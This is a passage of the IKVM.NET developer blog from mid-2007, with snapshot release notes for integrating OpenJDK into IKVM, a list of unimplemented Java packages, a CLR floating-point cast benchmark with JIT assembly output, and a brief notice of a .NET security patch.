		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9bdc9af1-7f46-482e-bd5a-aed5fe82a2f5"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9bdc9af1-7f46-482e-bd5a-aed5fe82a2f5">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 24 August 2007</h2></div>
<div class="newsItems"><a name="acdb9b2f5-b55e-4a98-8d0f-859bd366ba8d"></a><div class="entry">
	<h3 class="entryTitle">First OpenJDK Snapshot</h3>
	<div class="entryBody">
		<P>Several things conspired to make me realise that it would be a good idea to make an official release based on OpenJDK. While it is technically still a hybrid with GNU Classpath (it uses the AWT / Swing implementation from GNU Classpath 0.95), I don't consider this a big problem due to the fact that AWT support in OpenJDK itself still has holes in it as well (due to the "encumbrances") and the fact that IKVM never officially supported AWT / Swing (and still doesn't). This snapshot has been well tested and the disclaimers no longer apply. Please download it, play with it and report any issues you find (either here in the comments, on the mailing list or to me directly). I will hopefully release the first 0.36 release candidate at the end of next week.</P>
<P>In the past I was never able to give a list of the areas of GNU Classpath that worked or not, because I simply was't familiar enough with the large code base to know which parts were of good quality / compatibility and which weren't. With OpenJDK I can at least say where IKVM diverges from the OpenJDK code. So I've made a list of packages / classes that are not fully implemented or not supported.</P>
<P>
<TABLE cellSpacing=0>
<TBODY>
<TR>
<TD style="BORDER-TOP: black 1px solid">com.sun.security.auth.module&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD style="BORDER-TOP: black 1px solid">Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.applet</TD>
<TD>GNU Classpath implementation. Not supported.</TD></TR>
<TR>
<TD>java.awt</TD>
<TD>GNU Classpath implementation. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.io.Console</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.lang.instrument</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.lang.management</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.lang.ref.SoftReference</TD>
<TD>Soft references are never cleared.</TD></TR>
<TR bgColor=#f0f0f0>
<TD vAlign=top>java.lang.SecurityManager</TD>
<TD>Deprecated methods not implemented:<BR>classDepth(String), inClass(String), classLoaderDepth(), currentLoadedClass(), currentClassLoader(), inClassLoader()</TD></TR>
<TR>
<TD>java.net</TD>
<TD>No IPv6 support implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.net.ProxySelector</TD>
<TD>Getting the default system proxy for a URL is not implemented.</TD></TR>
<TR>
<TD>java.security</TD>
<TD>Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.text.Bidi</TD>
<TD>GNU Classpath implementation. Not supported.</TD></TR>
<TR>
<TD>java.util.zip</TD>
<TD>Partially based on GNU Classpath implementation.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.crypto</TD>
<TD>IcedTea implementation. Not supported.</TD></TR>
<TR>
<TD>javax.imageio.plugins.jpeg</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.management</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.print</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.script</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.security</TD>
<TD>Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.smartcardio</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.sound</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.swing</TD>
<TD>GNU Classpath implementation. Not supported.</TD></TR>
<TR>
<TD>javax.tools</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>org.ietfs.jgss</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>sun.jdbc.odbc</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>sun.net.www.content.audio</TD>
<TD>Audio content handlers not implemented.</TD></TR>
<TR>
<TD style="BORDER-BOTTOM: black 1px solid">sun.net.www.content.image</TD>
<TD style="BORDER-BOTTOM: black 1px solid">Image content handlers not implemented.</TD></TR></TBODY></TABLE></P>
<P>The entire public API is available, so "Not implemented." for javax.print, for example, means that the API is there but there is no backend to provide the actual printing support. "Not supported." means that the code is there and probably works at least somewhat, but that I'm less likely to fix bugs reported in these areas.</P>
<P>In addition to the issues listed above, the extended charset providers are not included (the ones in charsets.jar in the JRE) and enabling assertions is not implemented.</P>
<P>This snapshot is still based on OpenJDK B13, because the closer to 1.6 the better in my opinion. After the 0.36 release, I will start tracking the OpenJDK development version more closely, but I plan on supporting 0.36 for a relatively long time (even after 0.38 and subsequent IKVM releases).</P>
<P>I've updated the <A href="http://www.frijters.net/ikvm-japi-status.html">Japi results</A>. The scores are obviously very high now, but there are still some differences. Some differences are due to OpenJDK B13 already containing some new 1.7 APIs, some differences are in the AWT / Swing GNU Classpath code and some are Japi bugs (e.g. the java.util.concurrent differences).</P>
<P>Changes:</P>
<UL>
<LI>Renamed IKVM.Hybrid.GNU.Classpath.OpenJDK.dll to IKVM.OpenJDK.ClassLibrary.dll and made OpenJDK build the default.</LI>
<LI>Fixed thread creation to use AccessController.doPrivileged() to get ikvm.apartmentstate system property.</LI>
<LI>Fixed AccessController.getStackAccessControlContext() to use "native" method as marker on the stack for privileged operation (because the native method stub may get inlined away).</LI>
<LI>Added default security policy file to VFS.</LI>
<LI>Integrated OpenJDK java.beans package. Included OpenJDK sun.io package. Included OpenJDK sunw packages (for JDK 1.0 compatibility).</LI>
<LI>Don't create TypeWrapper instances for HideFromJava types.</LI>
<LI>Added rmi skeleton classes.</LI>
<LI>Integrated OpenJDK java.nio package.</LI>
<LI>Changed ikvmres protocol handler to be compatible with both GNU Classpath and OpenJDK url parse exception throwing convention.</LI>
<LI>Switched GNU Classpath AWT/Swing back to version 0.95.</LI>
<LI>Copied GNU Classpath version of java.text.Bidi into openjdk directory.</LI>
<LI>Copied and integrated GNU Classpath's pure Java zip support with OpenJDK zip classes.</LI>
<LI>Added GNU Classpath 0.95 compatible versions of awt\font.cs and awt\toolkit.cs.</LI>
<LI>Refactored system properties initialization.</LI>
<LI>Changed ikvm.exe class library version printing to report both GNU Classpath and OpenJDK versions.</LI>
<LI>Added HideFromJava to AnnotationAttribute type member that can potentially use HideFromJava types.</LI>
<LI>Implemented Thread.dumpThreads() and Thread.getThreads().</LI>
<LI>Added a couple more fake native libraries to VFS.</LI>
<LI>Implemented Thread.WaitUntilLastJniThread() (used by JNI method DestroyJavaVM() to wait for all non-daemon threads to end).</LI>
<LI>Implemented Inet4Address.isReachable().</LI>
<LI>Implemented path canonicalization.</LI>
<LI>Create java.lang.ProcessImpl streams via FileDescriptor instead of going through FileChannelImpl.</LI>
<LI>Added support for StructLayoutAttribute annotations.</LI>
<LI>New FileChannelImpl implementation based on OpenJDK.</LI>
<LI>Added map.xml workaround for java.net.DatagramSocket.receive() bug.</LI>
<LI>Implemented DatagramSocketImpl.peek() and peekData().</LI>
<LI>Don't add KeepAlive to constructors of objects that don't have finalizers and extend cli.System.Object.</LI>
<LI>Implemented sun.net.dns.ResolverConfigurationImpl "native" methods.</LI>
<LI>Added map.xml workaround for OpenJDK java.beans.XMLDecoder bug.</LI>
<LI>Fixed sun.nio.ch.DotNetSelectorImpl to make "infinite" blocking select block for Integer.MAX_VALUE instead of returning right away.</LI>
<LI>Fixed sun.nio.ch.Net.writeImpl() to return IOStatus.UNAVAILABLE if the socket is in non-blocking mode and the write failed because of this.</LI>
<LI>Added workaround for .NET 1.1 Directory.Delete() bug.</LI>
<LI>Updated all Java versions to 1.6.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-openjdk-0.35.2791.zip">ikvmbin-openjdk-0.35.2791.zip</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/24/2007 09:42:45 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=cdb9b2f5-b55e-4a98-8d0f-859bd366ba8d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=cdb9b2f5-b55e-4a98-8d0f-859bd366ba8d">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 09 August 2007</h2></div>
<div class="newsItems"><a name="a9b0366a5-a06e-4eaf-b252-de18723baea3"></a><div class="entry">
	<h3 class="entryTitle">New Hybrid Snapshot</h3>
	<div class="entryBody">
		<P>I did some stabilization work on the previous snapshot and I finally caved in and made floating point handling more compliant (still not fully compliant with the JVM spec, as that would be way too slow).</P>
<P>Changes:</P>
<UL>
<LI>Added support for generating access stubs in public interfaces that extend non-public interfaces.</LI>
<LI>Added workarounds for several OpenJDK class initialization order issues.</LI>
<LI>Fixed build process to include the rmi stubs and ties.</LI>
<LI>Renamed sun.misc.Unsafe instance field to theUnsafe, to facilitate sun.corba.Bridge which accesses the field thru reflection.</LI>
<LI>Changed AtomicBoolean.value field from boolean to int to be serialization compatible with JDK.</LI>
<LI>Fixed ArrayTypeWrapper.Finish().</LI>
<LI>Fixed java.lang.reflect.Array.set() to only unbox primitives when the array is a primitive array.</LI>
<LI>Fixed java.lang.reflect.Array.multiNewArray() to finish the array type before using it.</LI>
<LI>Implemented improved floating point compliance (strictfp is now honored and value set conversion is implemented).</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-hybrid-0.35.2777.zip">ikvmbin-hybrid-0.35.2777.zip</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/09/2007 10:16:51 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9b0366a5-a06e-4eaf-b252-de18723baea3"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9b0366a5-a06e-4eaf-b252-de18723baea3">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 07 August 2007</h2></div>
<div class="newsItems"><a name="af300c4e1-15b0-45ed-b6a6-b5dc8fb8089e"></a><div class="entry">
	<h3 class="entryTitle">Floating Point "Redundant" Cast Performance on the CLR</h3>
	<div class="entryBody">
		<P>Let's start out with a simple micro benchmark:</P><PRE><FONT color=#0000ff>using</FONT> System;<BR><FONT color=#0000ff>using</FONT> System.Threading;</PRE><PRE><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>Program<BR></FONT>{<BR>  <FONT color=#0000ff>public static void</FONT> Main()<BR>  {<BR><BR>    <FONT color=#0000ff>int</FONT> start = <FONT color=#2b91af>Environment</FONT>.TickCount;<BR>    <FONT color=#0000ff>double</FONT>[] d = <FONT color=#0000ff>new double</FONT>[1000];<BR>    <FONT color=#0000ff>for</FONT> (<FONT color=#0000ff>int</FONT> i = 0; i &lt; 1000000; i++)<BR>    {<BR>      <FONT color=#0000ff>for</FONT> (<FONT color=#0000ff>int</FONT> j = 0; j &lt; d.Length; j++)<BR>      {<BR>        d[j] = (<FONT color=#0000ff>double</FONT>)(3.0 * d[j]);<BR>      }<BR>    }<BR>    <FONT color=#0000ff>int</FONT> end = <FONT color=#2b91af>Environment</FONT>.TickCount;<BR>    <FONT color=#2b91af>Console</FONT>.WriteLine(end - start);<BR>  }<BR>}</PRE>
<P>On my system this takes about 7 seconds when run in optimized mode (i.e. not in the debugger).</P>
<P>Here's the optimized x86 code generated by the 2.0 CLR JIT for the body of the inner loop:</P><PRE>fld   qword ptr [ecx+edx*8+8]      ; d[j]
fmul  dword ptr ds:[007B1230h]     ; * 3.0 
fstp  qword ptr [esp]              ; (double) 
fld   qword ptr [esp]              ; (double) 
fstp  qword ptr [ecx+edx*8+8]      ; d[j] = </PRE>
<P>There first thing that jumps out is that the double cast takes two x87 instructions, a store and a load. Part of the reason the cast is expensive is because the value has to leave the FPU and go to main memory and back into the FPU. In this particular case it turns out to be <B>very</B> expensive, because <CODE>esp</CODE> happens to be not 8 byte aligned.</P>
<P>Making a seemingly unrelated change can make the micro benchmark much faster, just adding the following two lines at the top of the Main method will make the loop run in about 2.3 seconds on my system:</P><PRE>    <FONT color=#0000ff>double</FONT> dv = 0.0;<BR>    <FONT color=#2b91af>Interlocked</FONT>.CompareExchange(<FONT color=#0000ff>ref</FONT> dv, dv, dv);</PRE>
<P>The reason for this performance improvement becomes clear when we look at the method prologue in the new situation:</P><PRE>push  ebp 
mov   ebp,esp 
and   esp,0FFFFFFF8h 
push  edi 
push  esi 
push  ebx 
sub   esp,14h</PRE>
<P>This results in an 8 byte aligned <CODE>esp</CODE> pointer. As a result the <CODE>fstp/fld</CODE> instructions will run <B>much</B> faster. It looks like a "bug" in the JIT that it doesn't align the stack in the first scenario.</P>
<P>Of course, the much more obvious question is: Why does the cast generate code at all, isn't a double already a double?</P>
<P>Before answering this question, let's first look at another minor change to the micro benchmark. Let's remove the <CODE>Interlocked.CompareExchange()</CODE> again and change the inner loop body to the following:</P><PRE>    <FONT color=#0000ff>double</FONT> v = 3.0 * d[j];<BR>    d[j] = (<FONT color=#0000ff>double</FONT>)v;</PRE>
<P>With this change, the loop now takes just 1 second on my system. When we look at the x86 code generated by the JIT, it becomes obvious why:</P><PRE>fld   qword ptr [ecx+edx*8+8] 
fmul  dword ptr ds:[002A1170h] 
fstp  qword ptr [ecx+edx*8+8]</PRE>
<P>The redundant <CODE>fstp/fld</CODE> instructions are gone.</P>
<P>Back to the question of why the cast isn't always optimized away. The reason for this lies in the fact that the x87 FPU internally uses an extended 80 bit representation for floating point numbers. When you explicitly cast to a double, the ECMA CLI specification requires that this results in a conversion from the internal representation into the IEEE 64 bit representation. Of course, in this scenario we're already storing the value in memory, so this necessarily implies a conversion to the 64 bit representation, making the&nbsp;extra <FONT face="Courier New">fstp/fld</FONT>&nbsp;unnecessary.</P>
<P>Finally, in x64 mode all three variations of the benchmark take 1 second on my system. This is because the x64 CLR JIT uses SSE instructions that internally work on the IEEE 64 bit representation of doubles, so the cast is optimized away in all situations here.</P>
<P>For completeness, here's the code generated by the x64 JIT for the inner loop body:</P><PRE>movsd  xmm0,mmword ptr [rcx] 
mulsd  xmm0,mmword ptr [000000C0h] 
movsd  mmword ptr [rcx],xmm0 
</PRE>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/07/2007 15:02:08 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f300c4e1-15b0-45ed-b6a6-b5dc8fb8089e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f300c4e1-15b0-45ed-b6a6-b5dc8fb8089e">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 06 August 2007</h2></div>
<div class="newsItems"><a name="a3e7accf2-0338-4a5f-b691-ebd6762db07e"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.34 Update</h3>
	<div class="entryBody">
		<P>I made another 0.34 update, since 0.36 is probably still a ways off.</P>
<P>Changes:</P>
<UL>
<LI>Fixed handling of magic &#8220;assembly&#8221; type for assembly attribute annotations (bug #1721688). 
<LI>LocalVariableTable robustness fix (bug #1765952). 
<LI>Fixed handling of public interfaces extending non-public interfaces in ikvmc. 
<LI>Fixed parameter annotations on redirected contructors. 
<LI>Fixed casting ghost interface arrays (bug #1757889). 
<LI>Fixed JNI NewObject method. 
<LI>Fix to make sure all implemented interface methods on .NET types are public (so that ikvmstub generates jars that javac is happy with).</LI></UL>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.34.0.4.zip">ikvm-0.34.0.4.zip</A> (source + binaries) and <A href="http://www.frijters.net/ikvmbin-0.34.0.4.zip">ikvmbin-0.34.0.4.zip</A> (binaries).</P>
<P><STRONG>Update: </STRONG>I forgot to update the&nbsp;AWT toolkit property's assembly version. Fixed in current zips. Thanks to Ted O'Conner for pointing this out.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/06/2007 10:41:11 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3e7accf2-0338-4a5f-b691-ebd6762db07e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3e7accf2-0338-4a5f-b691-ebd6762db07e">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 02 August 2007</h2></div>
<div class="newsItems"><a name="aeaa95f0b-1895-4799-b1a4-9a7f7756d86d"></a><div class="entry">
	<h3 class="entryTitle">What about AWT / Swing Support?</h3>
	<div class="entryBody">
		<P>In the comments to the previous entry Martin asked:</P>
<DIV style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-STYLE: italic; BACKGROUND-COLOR: #f0f0f0">
<P>Would you support AWT / Swing as the Sun Version?</P></DIV>
<P>I've always said that AWT / Swing are not a priority for me and that won't change. Having said that, my current idea is to have two AWT back-ends, the default one similar to the current situation, i.e. a .NET Windows Forms based partial implementation. The second (optional) one would be the OpenJDK based implementation, using the OpenJDK native libraries. However, as usual, this is all subject to change.</P>
<P>Andrew asked:</P>
<DIV style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; FONT-STYLE: italic; BACKGROUND-COLOR: #f0f0f0">
<P>Okay, just wanted to clarify what you mean by 'integrating'. My understanding is you actually replace the GNU Classpath code with code copied from OpenJDK and then try and implement the necessary VM wotsits -- is that correct? If that is the case, presumably the end goal is to complete replace all the Classpath code. At the moment, that'd be a real shame because it would make IKVM more broken as lots of stuff like AWT/Swing is broken on OpenJDK.</P></DIV>
<P>That's not really true on IKVM. IKVM has never supported GNU Classpath's AWT/Swing implementation (it includes only the GNU Classpath implementation of the public API, the peer implementations are not used).</P>
<P>In case you're wondering why IKVM doesn't support the GNU Classpath peers, that's because the GNU Classpath peers don't support Windows and also because IKVM is built on top of the CLI and (almost all) the IKVM binaries are OS and CPU architecture independent, using native code is not compatible with that feature.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/02/2007 09:18:13 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=eaa95f0b-1895-4799-b1a4-9a7f7756d86d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=eaa95f0b-1895-4799-b1a4-9a7f7756d86d">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 01 August 2007</h2></div>
<div class="newsItems"><a name="ad559f55f-3262-45d8-af6b-e8e0849b093d"></a><div class="entry">
	<h3 class="entryTitle">New Hybrid Snapshot</h3>
	<div class="entryBody">
		<P>Major code bloat. I've now integrated the bulk of the OpenJDK code that isn't awt or swing. As a result the IKVM.Hybrid.GNU.Classpath.OpenJDK.dll assembly size has grown to about 26 MB. API coverage compared with JDK 1.6 is now at more than 98%. Note that doesn't mean that everything will work, because some back-end implementations are stubbed out or not included.</P>
<P><A HREF="/PermaLink.aspx?guid=03a85316-6639-4f04-b4ba-62ffec1713b4">Disclaimers apply</A>. I haven't done a full test pass on this build.</P>
<P>Changes:</P>
<UL>
<LI>OpenJDK: Integrated javax.management package (and sub packages).</LI>
<LI>OpenJDK: Integrated java.lang.management package (only a stub back-end implementation though).</LI>
<LI>OpenJDK: Integrated javax.imageio package (excluding the jpeg support, because OpenJDK uses native code for that).</LI>
<LI>OpenJDK: Integrated javax.activation, javax.annotation, javax.jws, javax.lang.model, javax.tools, javax.xml.*, org.jcp.xml.dsig.internal, org.relaxng.datatype, org.w3c.dom.*, org.xml.sax.* packages.</LI>
<LI>OpenJDK: Integrated javax.sql.* packages.</LI>
<LI>OpenJDK: Integrated javax.accessibility, javax.transaction, javax.activity packages.</LI>
<LI>OpenJDK: Integrated javax.print.* packages (no back-end implementation and ServiceUI is stubbed.)</LI>
<LI>OpenJDK: Integrated org.omg.*, javax.rmi.*, javax.sound.*, org.ietfs.jgss packages.</LI>
<LI>Fixed JNI NewObject method to actually create an object of the requested class, instead of the class of the constructor.</LI>
<LI>Added method name clash handling for AOT access stub methods.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-hybrid-0.35.2769.zip">ikvmbin-hybrid-0.35.2769.zip</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/01/2007 10:16:12 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d559f55f-3262-45d8-af6b-e8e0849b093d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d559f55f-3262-45d8-af6b-e8e0849b093d">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 26 July 2007</h2></div>
<div class="newsItems"><a name="ab6992022-54d5-4c67-b821-bcc830060c76"></a><div class="entry">
	<h3 class="entryTitle">New Hybrid Snapshot</h3>
	<div class="entryBody">
		<P>A major step in integrating OpenJDK code. One of the bottlenecks was the fact that currently OpenJDK is <A href="http://mail.openjdk.java.net/pipermail/discuss/2007-July/000116.html">missing most of the crypto code</A>, but thanks to the <A href="http://icedtea.classpath.org/wiki/Main_Page">IcedTea</A> project I've been able to integrate the OpenJDK java.security package and packages that depend on the crypto code (like java.net). I've also rewritten all socket implementation classes (both classic and nio) based on the OpenJDK code. FileChannelImpl and the&nbsp;direct and mapped&nbsp;byte buffers still need to be converted.</P>
<P>Some of the integrated packages don't have any back-end implementation (e.g. smartcardio and jgss). I'm not likely to implement smartcard support and will revisit the security and crypto stuff once Sun releases the crypto code.</P>
<P><A HREF="/PermaLink.aspx?guid=03a85316-6639-4f04-b4ba-62ffec1713b4">Disclaimers apply</A>. I haven't done a full test pass on this build.</P>
<P>Changes:</P>
<UL>
<LI>OpenJDK: Added support for "loading" fake native libraries from VFS and removed hack to bypass loadLibrary() call in System.initializeSystemClass().</LI>
<LI>OpenJDK: Integrated OpenJDK packages: java.net, java.security, java.util.jar, javax.naming, javax.net, javax.security, javax.smartcardio, java.nio.charset, java.nio.channels, java.nio.channels.spi</LI>
<LI>OpenJDK: Integrated IcedTea crypto/security classes.</LI>
<LI>OpenJDK: Fixed a race condition in Thread.interrupt().</LI>
<LI>Allow Object[] to be cast/assigned to ghost array. Fix for bug 1757889.</LI>
<LI>Fixed assembly annotation support (bug 1721688).</LI>
<LI>Added ikvmc warning when annotation type isn't found.</LI>
<LI>Added WINDOWS constant to ikvm.internal.Util to check if we're running on Windows.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-hybrid-0.35.2763.zip">ikvmbin-hybrid-0.35.2763.zip</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/26/2007 14:15:37 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b6992022-54d5-4c67-b821-bcc830060c76"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b6992022-54d5-4c67-b821-bcc830060c76">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 11 July 2007</h2></div>
<div class="newsItems"><a name="a8d66dab4-73b7-415b-a42a-0937f2fa3c8d"></a><div class="entry">
	<h3 class="entryTitle">.NET Framework Security Update</h3>
	<div class="entryBody">
		<P>Yesterday Microsoft released a <A href="http://www.microsoft.com/technet/security/Bulletin/MS07-040.mspx">security update</A> for the .NET Framework that fixes the bug I reported last <A HREF="/PermaLink.aspx?guid=3b9e044f-673d-462b-a16e-222a862f1df3">December</A>. I'll write a more detailed analysis (including a proof-of-concept exploit) in a couple of weeks.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/11/2007 07:10:17 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=8d66dab4-73b7-415b-a42a-0937f2fa3c8d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=8d66dab4-73b7-415b-a42a-0937f2fa3c8d">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 04 July 2007</h2></div>
<div class="newsItems"><a name="a377e9680-2c45-4a79-9bf7-c5249637950f"></a><div class="entry">
	<h3 class="entryTitle">New Hybrid Snapshot</h3>
	<div class="entryBody">
		<P>I decided to take a break from integrating new OpenJDK packages and instead focus on running some test cases and work on stabilization. Contrary to the previous hybrid snapshots, this version should be fairly usable. Feedback is appreciated.</P>
<P>Changes:</P>
<UL>
<LI>OpenJDK: Implemented java.util.concurrent.locks.LockSupport.</LI>
<LI>OpenJDK: Fixed race condition in Thread.interrupt() that could cause cli.System.Threading.ThreadInterruptedException to be thrown from interruptable waits/sleep.</LI>
<LI>OpenJDK: Imported and modified java.util.concurrent.locks.AbstractQueuedSynchronizer to make it more efficient and to remove the use of ReflectionFactory &amp; Unsafe to reduce initialization order dependencies.</LI>
<LI>OpenJDK: Changed unsafe to use more efficient internal helper class to copy java.lang.reflect.Field and make it accessible (this also reduces initialization order dependencies).</LI>
<LI>OpenJDK: Added lib/logging.properties to VFS and implemented an additional VFS operation required for reading it.</LI>
<LI>OpenJDK: Changed VFS ZipEntryStream.Read() to always try to read the requested number of bytes, instead of returning earlier. For maximum compatibility with real file i/o.</LI>
<LI>OpenJDK: Commented out system property setting in sun.misc.Version that was setting some version properties to bogus values.</LI>
<LI>OpenJDK: Fixed ObjectInputStream.latestUserDefinedLoader() to skip mscorlib stack frames.</LI>
<LI>OpenJDK: Added support to VFS for the VFS root directory.</LI>
<LI>OpenJDK: Fixed FieldAccessorImpl to check the type of the object passed in.</LI>
<LI>OpenJDK: "Implemented" ClassLoader.retrieveDirectives() by returning empty AssertionStatusDirectives object. Enabling assertions on the ikvm.exe command line is still not implemented.</LI>
<LI>OpenJDK: Switched to javac compiler for building OpenJDK sources.</LI>
<LI>Added workaround for .NET 1.1 reflection bug that causes methods that explicitly override a method to show up twice.</LI>
<LI>Changed handling of ldfld &amp; lfsfld opcodes in remapper to bypass "magic".</LI>
<LI>Restructured handling of fields defined in map.xml to enable referencing them from map.xml method bodies.</LI>
<LI>Fixed java.security.VMAccessController to make sure that if there is only system code on the stack, the resulting AccessControlContext isn't empty.</LI>
<LI>Updated to compile with GNU Classpath HEAD.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-hybrid-0.35.2741.zip">ikvmbin-hybrid-0.35.2741.zip</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/04/2007 15:04:10 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=377e9680-2c45-4a79-9bf7-c5249637950f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=377e9680-2c45-4a79-9bf7-c5249637950f">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 27 June 2007</h2></div>
<div class="newsItems"><a name="a8e64505e-ca29-4db1-8a4a-f49100326b75"></a><div class="entry">
	<h3 class="entryTitle">New Hybrid Snapshot</h3>
